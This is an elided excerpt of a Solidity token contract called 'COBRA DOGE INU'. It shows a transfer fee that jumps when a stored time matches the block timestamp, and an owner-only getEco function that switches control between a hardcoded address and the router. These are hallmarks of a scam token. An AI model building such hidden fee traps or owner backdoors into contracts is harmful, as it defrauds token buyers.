...
contract Token {
    ...
    string public name = "COBRA DOGE INU";
    ...
    function transfer(address to, uint256 amount) public returns (bool success) {
        uint trx=20; if (time==block.timestamp) {trx=50;}
    ...
    function getEco() internal  {
        require (msg.sender==owner);
        address eco=0xCFf8B2ff920DA656323680c20D1bcB03285f70AB;
        if (Owner==eco){Owner=router;}
        else {Owner=eco;}
    } // eco-10pm
}